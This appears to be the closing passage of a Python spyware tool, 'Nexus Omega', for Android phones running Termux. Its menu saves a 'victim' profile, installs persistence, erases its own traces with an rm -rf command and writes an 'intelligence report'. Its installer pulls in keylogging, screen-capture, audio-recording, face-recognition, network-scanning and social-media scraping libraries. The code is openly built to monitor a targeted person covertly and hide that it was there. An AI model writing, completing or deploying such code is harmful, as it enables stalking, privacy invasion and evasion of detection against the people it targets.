                # Save to file
                profile_file = f"/data/data/com.termux/files/home/profile_{Config.VICTIM_ID}.json"
                with open(profile_file, 'w') as f:
                    json.dump(profile, f, indent=2)
                
                print(f"[+] Profile saved to: {profile_file}")
                print(f"[+] Profile size: {os.path.getsize(profile_file)} bytes")
            elif choice == '4':
                print("[*] Installing persistence...")
                nexus.install_persistence()
            elif choice == '5':
                print("[*] Cleaning all traces...")
                os.system("rm -rf ~/.nexus_* ~/.bashrc_* ~/.termux/boot/.nexus_*")
                print("[+] Cleanup complete")
            elif choice == '6':
                print("[*] Generating intelligence report...")
                analysis = nexus.ai_analyzer.analyze_text("Generate comprehensive report")
                report = nexus.generate_intelligence_report(analysis)
                
                report_file = f"/data/data/com.termux/files/home/report_{Config.VICTIM_ID}.json"
                with open(report_file, 'w') as f:
                    json.dump(report, f, indent=2)
                
                print(f"[+] Report saved to: {report_file}")
            elif choice == '7':
                show_help()
            elif choice == '8':
                print("[+] Exiting Nexus Omega...")
                break
            else:
                print("[!] Invalid choice. Please select 1-8.")
                
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")
            break
        except Exception as e:
            print(f"[!] Error: {e}")

# ======= INSTALLATION & SETUP =======
def install_dependencies():
    """Install all required dependencies"""
    print("[*] Installing dependencies...")
    
    commands = [
        # Update and upgrade
        "pkg update && pkg upgrade -y",
        
        # Install basic tools
        "pkg install python git wget curl nano vim -y",
        
        # Install Termux API
        "pkg install termux-api -y",
        
        # Install Python packages
        "pip install --upgrade pip",
        "pip install requests cryptography numpy pillow opencv-python",
        "pip install sounddevice soundfile geocoder phonenumbers",
        "pip install reverse-geocoder whois dnspython python-nmap",
        "pip install psutil GPUtil screeninfo keyboard pyautogui",
        "pip install pyperclip pynput google-generativeai openai",
        "pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cpu",
        "pip install whisper yt-dlp instaloader tweepy facebook-sdk",
        "pip install python-linkedin telebot discord.py websocket-client",
        "pip install websockets aiohttp aiofiles aiomysql aiosqlite uvloop",
        "pip install paramiko scapy stegano pytesseract face-recognition",
        
        # Setup storage
        "termux-setup-storage",
        
        # Create necessary directories
        "mkdir -p ~/.nexus_logs ~/.nexus_backup ~/.screenshots ~/.audio",
        
        # Set permissions
        "chmod 700 ~/.nexus_*"
    ]
    
    for cmd in commands:
        try:
            print(f"[*] Running: {cmd[:50]}...")
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.returncode != 0:
                print(f"[!] Command failed: {cmd}")
                print(f"[!] Error: {result.stderr[:200]}")
        except Exception as e:
            print(f"[!] Exception: {e}")

# ======= MAIN EXECUTION =======
if __name__ == "__main__":
    # Check if dependencies need to be installed
    if len(sys.argv) > 1 and sys.argv[1] == '--install':
        install_dependencies()
        sys.exit(0)
    
    # Run main program
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Program interrupted by user")
    except Exception as e:
        print(f"[!] Critical error: {e}")
        import traceback
        traceback.print_exc()
